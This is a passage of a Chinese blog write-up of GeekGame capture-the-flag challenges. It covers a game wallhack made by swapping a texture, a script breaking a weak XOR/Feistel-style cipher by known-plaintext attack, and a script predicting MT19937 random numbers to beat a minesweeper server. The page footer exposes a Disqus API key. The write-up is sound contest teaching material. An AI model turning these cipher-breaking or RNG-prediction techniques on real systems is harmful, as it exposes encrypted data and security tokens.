 <span class="k">except</span> <span class="n">queue</span><span class="p">.</span><span class="n">Empty</span><span class="p">:</span>
     <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">command</span> <span class="o">=</span> <span class="n">Command</span><span class="p">.</span><span class="n">empty</span>
 <span class="k">else</span><span class="p">:</span>
     <span class="n">game</span><span class="p">.</span><span class="n">tick</span><span class="p">()</span>
     <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">TICKTIME</span><span class="p">)</span>
</code></pre></div>    </div>

    <p>操作为空时 <code class="language-plaintext highlighter-rouge">game.tick()</code> 不会被执行，可能是这一点导致了问题。解决方法很简单：</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">try</span><span class="p">:</span>
     <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">command</span> <span class="o">==</span> <span class="n">Command</span><span class="p">.</span><span class="n">empty</span><span class="p">:</span>
         <span class="n">x</span> <span class="o">=</span> <span class="n">cmds</span><span class="p">.</span><span class="n">get_nowait</span><span class="p">()</span>
         <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">command</span> <span class="o">=</span> <span class="n">x</span>
 <span class="k">except</span> <span class="n">queue</span><span class="p">.</span><span class="n">Empty</span><span class="p">:</span>
     <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">command</span> <span class="o">=</span> <span class="n">Command</span><span class="p">.</span><span class="n">empty</span>
 <span class="n">game</span><span class="p">.</span><span class="n">tick</span><span class="p">()</span>
 <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">TICKTIME</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
</ol>

<p>这样就能玩了。看代码可以看到 <code class="language-plaintext highlighter-rouge">evildirt</code>，可以猜测这个东西是我们不能碰的。那怎么办呢？我们来开透视挂！</p>

<p>加载贴图的逻辑在 <code class="language-plaintext highlighter-rouge">load_texture()</code> 里，把 <code class="language-plaintext highlighter-rouge">Elem.evildirt</code> 对应加载的图片改成别的就行（比如说 <code class="language-plaintext highlighter-rouge">playerHurtR</code>）。需要注意不改代码直接改 msi 是没用的，因为：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'textures.msi'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="p">(</span><span class="n">f</span><span class="p">):</span>
    <span class="n">PSK</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()).</span><span class="n">digest</span><span class="p">()</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">PSK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span>
</code></pre></div></div>

<p>通信过程中 <code class="language-plaintext highlighter-rouge">PSK</code> 不对会导致运行失败。</p>

<p>开挂后效果如下：</p>

<p class="center"><img src="/pictures/geekgame-wp/newgame/1.jpg" alt="cheat" /></p>

<p class="center"><em>图 8. 透视挂</em></p>

<p>别告诉我你开了挂都过不了.png</p>

<p>虽然最后几关就算开了挂也挺刺激的。别忘了 <code class="language-plaintext highlighter-rouge">show_hud</code> 里顺便 <code class="language-plaintext highlighter-rouge">print()</code> 一下，不然你就白玩了（</p>

<p>最终效果：</p>

<p class="center"><img src="/pictures/geekgame-wp/newgame/2.jpg" alt="final" /></p>

<p class="center"><em>图 9. 获得第一小题 flag</em></p>

<p>因为不太会写算法，第二题没有完成。</p>

<h2 id="密码学实践">密码学实践</h2>

<p><em>（仅做出第一题）</em></p>

<p>我不太会 RSA，不过刚好第一题不需要会（</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="n">MESenc</span><span class="p">(</span><span class="n">pad</span><span class="p">((</span><span class="s">"Hello, Alice! I will give you two flags. The first is: "</span><span class="o">+</span><span class="n">flag1</span><span class="p">(</span><span class="n">token</span><span class="p">)).</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)),</span><span class="n">Public_key</span><span class="p">).</span><span class="nb">hex</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">MESenc</span><span class="p">(</span><span class="n">pad</span><span class="p">((</span><span class="s">"Sorry, I forget to verify your identity. Please give me your certificate."</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)),</span><span class="n">Public_key</span><span class="p">).</span><span class="nb">hex</span><span class="p">())</span>
</code></pre></div></div>

<p>似乎是已知明文攻击。其中 <code class="language-plaintext highlighter-rouge">MESenc()</code> 的实现：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">MESenc</span><span class="p">(</span><span class="n">mess</span><span class="p">:</span><span class="nb">bytes</span><span class="p">,</span><span class="n">skey</span><span class="p">:</span><span class="nb">bytes</span><span class="p">):</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">skey</span><span class="p">)</span><span class="o">==</span><span class="mi">8</span><span class="o">*</span><span class="mi">32</span>
    <span class="n">keys</span> <span class="o">=</span> <span class="p">[</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">skey</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)]</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">mess</span><span class="p">)</span><span class="o">%</span><span class="mi">32</span> <span class="o">==</span> <span class="mi">0</span>
    <span class="n">cip</span><span class="o">=</span><span class="sa">b</span><span class="s">""</span>
    <span class="k">for</span> <span class="n">it</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">mess</span><span class="p">),</span><span class="mi">32</span><span class="p">):</span>
        <span class="n">pmess</span><span class="o">=</span><span class="n">mess</span><span class="p">[</span><span class="n">it</span><span class="p">:</span><span class="n">it</span><span class="o">+</span><span class="mi">32</span><span class="p">]</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">pmess</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
        <span class="n">b</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">pmess</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">pmess</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
        <span class="n">d</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">pmess</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="mi">32</span><span class="p">])</span>
        <span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">d</span><span class="p">))</span>
        <span class="n">ori_a</span><span class="p">,</span> <span class="n">ori_b</span><span class="p">,</span> <span class="n">ori_c</span><span class="p">,</span> <span class="n">ori_d</span> <span class="o">=</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span>
        <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">keys</span><span class="p">:</span>
            <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span> <span class="o">=</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">a</span> <span class="o">^</span> <span class="n">c</span> <span class="o">^</span> <span class="n">key</span>
        <span class="k">print</span><span class="p">(</span><span class="n">ori_c</span><span class="o">^</span><span class="n">a</span><span class="p">,</span> <span class="n">ori_d</span><span class="o">^</span><span class="n">b</span><span class="p">,</span> <span class="n">ori_a</span><span class="o">^</span><span class="n">ori_c</span><span class="o">^</span><span class="n">c</span><span class="p">,</span> <span class="n">ori_b</span><span class="o">^</span><span class="n">ori_d</span><span class="o">^</span><span class="n">d</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">)</span>
        <span class="nb">input</span><span class="p">()</span>
        <span class="n">cip</span><span class="o">+=</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">d</span>
    <span class="k">return</span> <span class="n">cip</span>
</code></pre></div></div>

<p>中间的异或让人感觉问题很大，纸上推了推，最后会变成这样：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c^key0 d^key1 a^c^key2 b^d^key3
</code></pre></div></div>

<p>其中 <code class="language-plaintext highlighter-rouge">key[0-3]</code> 对相同的 skey 都相同。那么已知 “Sorry, I forget to verify your identity. Please give me your certificate.” 的密文和 flag 的密文，就能知道 flag 的明文。</p>

<p>脚本如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">rsa</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>

<span class="n">enc0</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"ca58e223c555c1286707e9bca934db7ae2ba50e6a35f08e311c0c8998dd31d41ce45ae26960888386e46f7a89a719e5ec1e216e3fe49129c54bcdd8dbfd07837e250e010aa65ee230a2f98dbd41ca705d6b272e6cd2653de20f3b1c49fbe1b7a"</span><span class="p">)</span>
<span class="n">enc1</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"c95eae398040c1387b07e9bca9668f64fab602e2f04a08fb41cfc48ecbc4745fda58f82ac55fcd7e7b48e5a1fc77ca7fdeba48f7a50d5dda41b6cb8498c32044aa269958f225bf49153087c4cb03b81abec82198986222a62189d293d9d32016"</span><span class="p">)</span>

<span class="n">plain1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'Sorry, I forget to verify your identity. Please give me your certificate.</span><span class="se">\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17\x17</span><span class="s">'</span>

<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc0</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">enc1</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">plain1</span><span class="p">))</span>

<span class="k">for</span> <span class="n">it</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">plain1</span><span class="p">),</span> <span class="mi">32</span><span class="p">):</span>
    <span class="n">pplain</span> <span class="o">=</span> <span class="n">plain1</span><span class="p">[</span><span class="n">it</span><span class="p">:</span><span class="n">it</span> <span class="o">+</span> <span class="mi">32</span><span class="p">]</span>
    <span class="n">penc</span> <span class="o">=</span> <span class="n">enc1</span><span class="p">[</span><span class="n">it</span><span class="p">:</span><span class="n">it</span> <span class="o">+</span> <span class="mi">32</span><span class="p">]</span>

    <span class="n">pa</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">pplain</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
    <span class="n">pb</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">pplain</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>
    <span class="n">pc</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">pplain</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
    <span class="n">pd</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">pplain</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="mi">32</span><span class="p">])</span>

    <span class="n">ea</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">penc</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
    <span class="n">eb</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">penc</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>
    <span class="n">ec</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">penc</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
    <span class="n">ed</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">penc</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="mi">32</span><span class="p">])</span>

    <span class="k">print</span><span class="p">(</span><span class="n">pc</span><span class="o">^</span><span class="n">ea</span><span class="p">,</span> <span class="n">pd</span><span class="o">^</span><span class="n">eb</span><span class="p">,</span> <span class="n">pa</span><span class="o">^</span><span class="n">pc</span><span class="o">^</span><span class="n">ec</span><span class="p">,</span> <span class="n">pb</span><span class="o">^</span><span class="n">pd</span><span class="o">^</span><span class="n">ed</span><span class="p">)</span>

<span class="n">ka</span><span class="p">,</span> <span class="n">kb</span><span class="p">,</span> <span class="n">kc</span><span class="p">,</span> <span class="n">kd</span> <span class="o">=</span> <span class="mi">13632834020826064990</span><span class="p">,</span> <span class="mi">155251951772413709</span><span class="p">,</span> <span class="mi">15976045680876863956</span><span class="p">,</span> <span class="mi">1768175861176147990</span>
<span class="k">for</span> <span class="n">it</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">plain1</span><span class="p">),</span> <span class="mi">32</span><span class="p">):</span>
    <span class="n">penc</span> <span class="o">=</span> <span class="n">enc0</span><span class="p">[</span><span class="n">it</span><span class="p">:</span><span class="n">it</span> <span class="o">+</span> <span class="mi">32</span><span class="p">]</span>

    <span class="n">ea</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">penc</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
    <span class="n">eb</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">penc</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>
    <span class="n">ec</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">penc</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
    <span class="n">ed</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">penc</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="mi">32</span><span class="p">])</span>

    <span class="n">pa</span><span class="p">,</span> <span class="n">pb</span><span class="p">,</span> <span class="n">pc</span><span class="p">,</span> <span class="n">pd</span> <span class="o">=</span> <span class="p">(</span><span class="n">ka</span><span class="o">^</span><span class="n">ea</span><span class="p">,</span> <span class="n">kb</span><span class="o">^</span><span class="n">eb</span><span class="p">,</span> <span class="n">kc</span><span class="o">^</span><span class="n">ec</span><span class="p">,</span> <span class="n">kd</span><span class="o">^</span><span class="n">ed</span><span class="p">)</span>
    <span class="c1"># pc = a^c, pd = b^d
</span>    <span class="n">pc</span> <span class="o">=</span> <span class="n">pc</span> <span class="o">^</span> <span class="n">pa</span>
    <span class="n">pd</span> <span class="o">=</span> <span class="n">pd</span> <span class="o">^</span> <span class="n">pb</span>
    <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span> <span class="o">=</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">pa</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">pb</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">pc</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">pd</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>

<span class="c1"># b'Hello, A' b'lice! I ' b'will giv' b'e you tw'
# b'o flags.' b' The fir' b'st is: f' b'lag{Fe1S'
# b'TeL_neTw' b'0rk_Ne3d' b'_an_OWF}' b'\x08\x08\x08\x08\x08\x08\x08\x08'
</span>
<span class="c1"># flag{Fe1STeL_neTw0rk_Ne3d_an_OWF}
</span></code></pre></div></div>

<p>其中 <code class="language-plaintext highlighter-rouge">enc0</code> 和 <code class="language-plaintext highlighter-rouge">enc1</code> 取任意一次执行结果即可。</p>

<p>第二题没有看出思路，我觉得还挺安全的（？？？），构造不出 <code class="language-plaintext highlighter-rouge">aname == b'Alice'</code>（？？？？？），可能我还是只适合 web 和 misc（</p>

<h2 id="扫雷">扫雷</h2>

<p><em>（仅做出第一题）</em></p>

<p>一开始我真的以为是要扫雷，去搜了一圈 solver，发现 solver 几乎都假设已知雷的个数，之后就放一边了。第一阶段结束前那个凌晨又看了看，然后，Flag 1 就是预测随机数啊！而且最困难的部分网上有现成的库，来个连续的 624 个随机数就行。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">mt19937predictor</span> <span class="kn">import</span> <span class="n">MT19937Predictor</span>

<span class="n">token</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"your token"</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="s">"prob09.geekgame.pku.edu.cn"</span><span class="p">,</span> <span class="mi">10009</span><span class="p">))</span>
<span class="n">io</span><span class="p">.</span><span class="n">read_until</span><span class="p">(</span><span class="sa">b</span><span class="s">"token: "</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">read_until</span><span class="p">(</span><span class="sa">b</span><span class="s">"(y/n)"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">"n"</span><span class="p">)</span>

<span class="n">predictor</span> <span class="o">=</span> <span class="n">MT19937Predictor</span><span class="p">()</span>
<span class="k">for</span> <span class="n">cnt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">624</span><span class="p">):</span>
    <span class="n">num</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
            <span class="n">io</span><span class="p">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
            <span class="n">io</span><span class="p">.</span><span class="n">writeline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="n">x</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
            <span class="k">if</span> <span class="sa">b</span><span class="s">'BOOM'</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
                <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
                    <span class="n">_</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
                    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="o">==</span> <span class="mi">16</span>
                    <span class="n">t</span> <span class="o">=</span> <span class="s">""</span>
                    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">_</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
                        <span class="k">if</span> <span class="n">l</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'*'</span><span class="p">):</span>
                            <span class="n">t</span> <span class="o">+=</span> <span class="s">"1"</span>
                        <span class="k">else</span><span class="p">:</span>
                            <span class="n">t</span> <span class="o">+=</span> <span class="s">"0"</span>
                    <span class="n">num</span> <span class="o">=</span> <span class="n">t</span> <span class="o">+</span> <span class="n">num</span>
                <span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
                <span class="n">predictor</span><span class="p">.</span><span class="n">setrandbits</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mi">16</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
                <span class="n">io</span><span class="p">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">"n)"</span><span class="p">)</span>
                <span class="n">io</span><span class="p">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">"y"</span><span class="p">)</span>
                <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="k">break</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">continue</span>
        <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
            <span class="k">break</span>

<span class="c1"># io.read_until("n)")
# io.writeline("y")
</span><span class="n">num</span> <span class="o">=</span> <span class="n">predictor</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">16</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">num</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">j</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">io</span><span class="p">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
            <span class="n">io</span><span class="p">.</span><span class="n">writeline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">interact</span><span class="p">()</span>
</code></pre></div></div>

<p>第二题不太会（</p>

<h2 id="总结">总结</h2>

<p>真好玩啊！就是这个礼拜睡眠时间不太够。尤其是 web 题的质量很高（我不太喜欢 misc 的套娃题，不过内嵌的剧情让我的不满程度下降了很多），binary 和 algorithm 因为自己就没做出几道完整的题，个人没法给合理的评价，不过看起来也很不错。</p>

<p>作为今年 hackergame 的 staff 之一，我很清楚对于这样的比赛（特别是允许校外参加而且时间长的比赛）来说，工作人员是非常非常辛苦的，在此我个人对 geekgame 的工作人员表示感谢，撒花🎉！</p>

<p>总之，太好玩了⑧！明年有机会一定还来！</p>

<p>（另外，我要调整一下作息时间了……为了打比赛这周天天凌晨三四点睡。</p>

<h2 id="花絮copilot-迷惑行为">花絮：Copilot 迷惑行为</h2>

<p>写 writeups 的时候我开了 GitHub Copilot，下面分享一些比较有意思的场面：</p>

<p class="center"><img src="/pictures/geekgame-wp/extra/copilot1.png" alt="copilot-1" /></p>

<p class="center"><em>图 10. 得到假 flag.png</em></p>

<p class="center"><img src="/pictures/geekgame-wp/extra/copilot2.png" alt="copilot-2" /></p>

<p class="center"><em>图 11. 串题了.png</em></p>

<p class="center"><img src="/pictures/geekgame-wp/extra/copilot3.png" alt="copilot-3" /></p>

<p class="center"><em>图 12. 没有解决.png</em></p>

<p class="center"><img src="/pictures/geekgame-wp/extra/copilot4.png" alt="copilot-4" /></p>

<p class="center"><em>图 13. 好像哪里不对，又好像没啥问题.png</em></p>


  </div>

  
    <div class="post-comments" itemprop="comment">
      <hr />
<h3>Comments</h3>
<div id="disqus_thread"></div>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css">
<script src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js"></script>
<script>
var dsqjs = new DisqusJS({
    shortname: 'taokyblog',
    siteName: 'taoky\'s blog',
    // identifier: '',
    // url: '',
    // title: '',
    api: '//blog.taoky.moe/api/',
    apikey: 'L3W1Q35kDbi2ZGTV2iEfZ8SIksrYf847Ft0ufGon9ye1PTVxG902wO3FtIUq4wgO',
    nocomment: '无评论.',
    admin: 'taoky',
    adminLabel: 'taoky'
});
/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
// (function() { // DON'T EDIT BELOW THIS LINE
// var d = document, s = d.createElement('script');
// s.src = 'https://taokyblog.disqus.com/embed.js';
// s.setAttribute('data-timestamp', +new Date());
// (d.head || d.body).appendChild(s);
// })();
</script>
<noscript>Disqus comment requires JavaScript.</a></noscript>
    </div>
  

</article>

      </div>
    </main>

    <footer class="site-footer">

  <div class="wrapper">

    <p>
      

Author: taoky - Subscribe via <a href="https://blog.taoky.moe/feed.xml">RSS</a>
<br>
License: <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议（CC-BY-NC-SA 4.0）</a>
    </p>

  </div>

</footer>


  </body>

</html>
